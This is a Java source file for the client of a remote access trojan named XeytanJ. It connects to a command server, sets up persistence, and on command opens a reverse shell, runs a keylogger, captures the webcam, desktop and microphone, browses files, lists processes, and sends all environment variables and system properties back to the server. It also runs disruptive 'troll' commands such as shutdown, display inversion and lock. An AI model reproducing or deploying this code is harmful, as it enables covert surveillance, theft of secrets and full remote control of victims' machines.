package com.melardev.xeytanj;

import com.melardev.xeytanj.config.IConfigService;
import com.melardev.xeytanj.config.ManifestConfigService;
import com.melardev.xeytanj.enums.SessionType;
import com.melardev.xeytanj.explorer.FileManager;
import com.melardev.xeytanj.gui.chat.ChatGUI;
import com.melardev.xeytanj.logger.ConsoleLogger;
import com.melardev.xeytanj.microphone.Microphone;
import com.melardev.xeytanj.microphone.MicrophoneNIO;
import com.melardev.xeytanj.net.packets.*;
import com.melardev.xeytanj.net.packets.filesystem.PacketFileExplorer;
import com.melardev.xeytanj.net.packets.multimedia.PacketCameraRequest;
import com.melardev.xeytanj.net.packets.multimedia.PacketDesktopRequest;
import com.melardev.xeytanj.net.packets.process.PacketProcess;
import com.melardev.xeytanj.net.packets.voice.PacketVoice;
import com.melardev.xeytanj.net.services.NetClientService;
import com.melardev.xeytanj.net.services.async.completion.AsyncCompletionHandlerNetService;
import com.melardev.xeytanj.remote.PacketHandler;
import com.melardev.xeytanj.services.*;
import com.melardev.xeytanj.utils.FileUtils;

import java.awt.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;

public class XeytanJClient implements IApplication {

    private final String host;
    private final ConsoleLogger logger;

    private volatile ChatGUI pendingChatWindow;
    private int port;
    private IConfigService config;

    private Map<SessionType, PacketHandler> openedSessions;
    private NetClientService netSyncService;

    public XeytanJClient() {
        config = new ManifestConfigService();
        String host = config.getServerHost();
        String port = config.getServerPort();

        if (host == null)
            host = "127.0.0.1";
        if (port == null)
            port = "3002";

        this.host = host;
        this.port = Integer.parseInt(port);
        openedSessions = new HashMap<>();
        logger = new ConsoleLogger();
    }


    public static void main(String[] args) {
        new XeytanJClient().start();
    }

    public void start() {

        if (config.isPersistenceEnabled()) {
            Persistence.makePersistence();
        }

        // netSyncService = new ClientSelectService(this, this.host, this.port, this.logger, this.config);
        netSyncService = new AsyncCompletionHandlerNetService(this, this.host, this.port, this.logger, this.config);
        netSyncService.interact();
    }

    private void reset() {
        start();
    }

    public void handlePacket(Packet packet) throws IOException {
        logger.traceCurrentMethodName();
        switch (packet.getType()) {
            case LOGIN:
                logger.trace("Login");
                PacketLogin packetLogin = (PacketLogin) packet;
                if (packetLogin.getLoginType() == PacketLogin.LoginType.LOGIN_RESPONSE) {
                    System.out.println("Logged in successfully");
                }
                break;
            case FILE_EXPLORER:
                handleFileExplorerPacket((PacketFileExplorer) packet);
                break;
            case CAMERA_CONFIG:
            case CAMERA:
                handleCameraPacket((PacketCameraRequest) packet);
                break;

            case DESKTOP_CONFIG:
            case DESKTOP:
                handleDesktopPacket((PacketDesktopRequest) packet);
                break;
            case KEYLOGGER:
                handleKeyloggerPacket((PacketKeylog) packet);
                break;
            case PRESENTATION:
                String geoData = getGeoData();

                //HashSet<Object> props = new HashSet<>(System.getProperties().entrySet());
                HashMap<String, String> properties = new HashMap<String, String>();
                for (Entry<Object, Object> entry : System.getProperties().entrySet()) {
                    properties.put((String) entry.getKey(), entry.getValue().toString());
                }
                HashMap<String, String> env = new HashMap<String, String>(System.getenv());
                String os = System.getProperty("os.name");
                netSyncService.sendPacket(new PacketPresentation(geoData, properties, env, os));
                break;
            case PROCESS:
                handleProcessPacket((PacketProcess) packet);
                break;
            case CHAT:
                handleChatPacket((PacketChat) packet);

                break;
            case SHELL:
                handlePacketShell((PacketShell) packet);

                break;
            case VOICE:
                PacketVoice pv = (PacketVoice) packet;
                new Thread((Runnable) () -> {
                    Microphone mic;
                    MicrophoneNIO micn;
                    if (pv.mode == PacketVoice.Mode.FILE)
                        mic = new Microphone(this);
                    else if (pv.mode == PacketVoice.Mode.RAW) //TODO:Not Working
                    {
                        //    micn = new MicrophoneNIO("127.0.0.1", pv.getPort());
                    }
                }).start();
                break;
            case TROLL:
                PacketTroll pt = (PacketTroll) packet;
                new Thread(() -> {
                    performTroll(pt.command);
                }).start();
                break;
            case CLOSE:
                // TODO: Improve the process shutdown, release the opened files if any, the webcam, exit the keylogger, etc.
                netSyncService.closeConnection();
                System.exit(0);
                break;
            case UNINSTALL:
                Persistence.removePersistence();
                netSyncService.closeConnection();
                System.exit(0);
                break;
            default:
                break;
        }

    }

    private void handlePacketShell(PacketShell packet) {

        logger.traceCurrentMethodName();
        if (!openedSessions.containsKey(SessionType.REVERSE_SHELL)) {
            ShellHandler shellHandler = new ShellHandler(this, logger);
            openedSessions.put(SessionType.REVERSE_SHELL, shellHandler);
            shellHandler.init();
        }

        ShellHandler handler = (ShellHandler) openedSessions.get(SessionType.REVERSE_SHELL);
        handler.handlePacket(packet);
    }

    private void handleChatPacket(PacketChat packet) {
        logger.traceCurrentMethodName();
        if (!openedSessions.containsKey(SessionType.CHAT_SERVICE)) {
            ChatHandler handler = new ChatHandler(this);
            handler.setLogger(logger);
            openedSessions.put(SessionType.CHAT_SERVICE, handler);
        }

        ChatHandler handler = (ChatHandler) openedSessions.get(SessionType.CHAT_SERVICE);
        handler.handlePacket(packet);
    }

    private void handleProcessPacket(PacketProcess packet) {
        logger.traceCurrentMethodName();
        ProcessHandler processHandler;
        processHandler = new ProcessHandler(this);
        processHandler.setLogger(logger);
        processHandler.handlePacket(packet);
    }

    private void handleKeyloggerPacket(PacketKeylog packet) {
        logger.traceCurrentMethodName();
        if (!openedSessions.containsKey(SessionType.KEYLOG)) {
            KeylogHandler keylogHandler = new KeylogHandler(this);
            openedSessions.put(SessionType.KEYLOG, keylogHandler);
            keylogHandler.init();
        } else {
            KeylogHandler handler = (KeylogHandler) openedSessions.get(SessionType.KEYLOG);
            handler.handlePacket(packet);
        }
    }

    private void handleDesktopPacket(PacketDesktopRequest packet) {
        logger.traceCurrentMethodName();
        if (!openedSessions.containsKey(SessionType.REMOTE_DESKTOP)) {
            startDesktopSession();
        }

        DesktopHandler desktopHandler = (DesktopHandler) openedSessions.get(SessionType.REMOTE_DESKTOP);
        desktopHandler.handlePacket(packet);
    }

    private void startDesktopSession() {
        logger.traceCurrentMethodName();
        try {
            DesktopHandler desktopHandler = new DesktopHandler(this);
            desktopHandler.setLogger(logger);
            openedSessions.put(SessionType.REMOTE_DESKTOP, desktopHandler);
        } catch (AWTException e) {
            e.printStackTrace();
        }

    }

    private void handleCameraPacket(PacketCameraRequest packet) {
        logger.traceCurrentMethodName();
        if (!openedSessions.containsKey(SessionType.CAMERA)) {
            if (packet.getClass() != PacketCameraRequest.class)
                throw new IllegalStateException("Expected CameraRequest packet");

            startCameraSession(packet);
        }
        CameraHandler handler = (CameraHandler) openedSessions.get(SessionType.CAMERA);
        handler.handlePacket(packet);

    }

    private void startCameraSession(PacketCameraRequest packetCamera) {
        logger.traceCurrentMethodName();

        CameraHandler cameraHandler = new CameraHandler(this, logger);
        cameraHandler.setLogger(logger);
        cameraHandler.setRecordAudio(packetCamera.isRecordAudio());

        openedSessions.put(SessionType.CAMERA, cameraHandler);

    }

    private void handleFileExplorerPacket(PacketFileExplorer packet) throws IOException {
        logger.traceCurrentMethodName();
        if (!openedSessions.containsKey(SessionType.FILE_SYSTEM)) {
            startFileSystemExplorer();
        }
        FileManager handler = (FileManager) openedSessions.get(SessionType.FILE_SYSTEM);
        handler.handlePacket(packet);
    }

    private void startFileSystemExplorer() {
        logger.traceCurrentMethodName();
        FileManager fm = new FileManager(this, logger);
        openedSessions.put(SessionType.FILE_SYSTEM, fm);
    }

    private String getGeoData() {
        logger.traceCurrentMethodName();
        if (true)
            return "{\"as\":\"AS6739 VODAFONE ONO, S.A.\",\"city\":\"Girona\",\"country\":\"Spain\",\"countryCode\":\"ES\",\"isp\":\"Vodafone Ono\",\"lat\":41.9831,\"lon\":2.8249,\"org\":\"Vodafone Ono\",\"query\":\"62.83.179.175\",\"region\":\"CT\",\"regionName\":\"Catalonia\",\"status\":\"success\",\"timezone\":\"Europe/Madrid\",\"zip\":\"17002\"}";
        StringBuilder sb = new StringBuilder();
        try {
            URL url = new URL("http://ip-api.com/json/?lang=en");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            String line = "";
            while ((line = br.readLine()) != null) {
                sb.append(line);
            }
        } catch (MalformedURLException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return sb.toString();
    }


    private void performTroll(PacketTroll.Command command) {
        logger.traceCurrentMethodName();
        String os = System.getProperty("os.name").toLowerCase();
        String cmd = null;
        if (os.contains("windows")) {
            String filePath = FileUtils.exportResFile("/executables/troller/windows/troller.exe");
            if (filePath == null)
                return;
            switch (command) {
                case LOG_OFF:
                    cmd = "LogOff";
                    break;
                case SHUTDOWN:
                    cmd = "";
                    break;
                case REBOOT:
                    cmd = "Reboot";
                    break;
                case TURN_ON_DISPLAY:
                    cmd = "displayOn";
                    break;
                case TURN_OFF_DISPLAY:
                    cmd = "displayOff";
                    break;
                case CDROM_OPEN:
                    cmd = "CDRomOpen";
                    break;
                case CDROM_CLOSE:
                    cmd = "CDRomClose";
                    break;
                case LOCK:
                    cmd = "LockSystem";
                    break;
                case INVERT_COLORS:
                    cmd = "InvertColors";
                    break;
                case INVERT_DISPLAY:
                    cmd = "InvertDisplay";
                    break;
                default:
                    return;
            }
            executeCommand(filePath + " " + cmd);
        } else if (os.contains("linux")) {
            switch (command) {
                case LOG_OFF:
                    cmd = "logout";
                    break;
                case SHUTDOWN:
                    cmd = "shutdown -h now";
                    break;
                case REBOOT:
                    cmd = "reboot";
                    break;
                case TURN_ON_DISPLAY:
                    cmd = "xset dpms force on";
                    break;
                case TURN_OFF_DISPLAY:
                    cmd = "xset dpms force off";
                    break;
                case CDROM_OPEN:
                    cmd = "eject -r";
                    break;
                case CDROM_CLOSE:
                    break;
                default:
                    return;
            }
            executeCommand(cmd);
        }
    }

    private void executeCommand(String command) {
        logger.traceCurrentMethodName();
        try {
            Process proc = Runtime.getRuntime().exec(command);
            synchronized (proc) {
                proc.wait(5000);
                proc.destroy();
            }
        } catch (IOException e) {
            e.printStackTrace();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void onFileSystemSessionClosed() {
        logger.traceCurrentMethodName();
        openedSessions.remove(SessionType.FILE_SYSTEM);
    }


    @Override
    public void onSessionClosed(SessionType sessionType) {
        logger.traceCurrentMethodName();
        if (sessionType == SessionType.REMOTE_DESKTOP)
            this.openedSessions.remove(SessionType.REMOTE_DESKTOP);
        else if (sessionType == SessionType.CAMERA)
            openedSessions.remove(SessionType.CAMERA);
        else if (sessionType == SessionType.LIST_PROCESS)
            openedSessions.remove(SessionType.LIST_PROCESS);
        else if (sessionType == SessionType.REVERSE_SHELL)
            openedSessions.remove(SessionType.REVERSE_SHELL);
        else if (sessionType == SessionType.KEYLOG)
            openedSessions.remove(SessionType.KEYLOG);
        else if (sessionType == SessionType.AUDIO)
            openedSessions.remove(SessionType.AUDIO);
        else if (sessionType == SessionType.INFO)
            openedSessions.remove(SessionType.INFO);
        else if (sessionType == SessionType.CHAT_SERVICE)
            openedSessions.remove(SessionType.CHAT_SERVICE);
    }

    @Override
    public void sendPacket(Packet packet) {
        netSyncService.sendPacket(packet);
    }
}
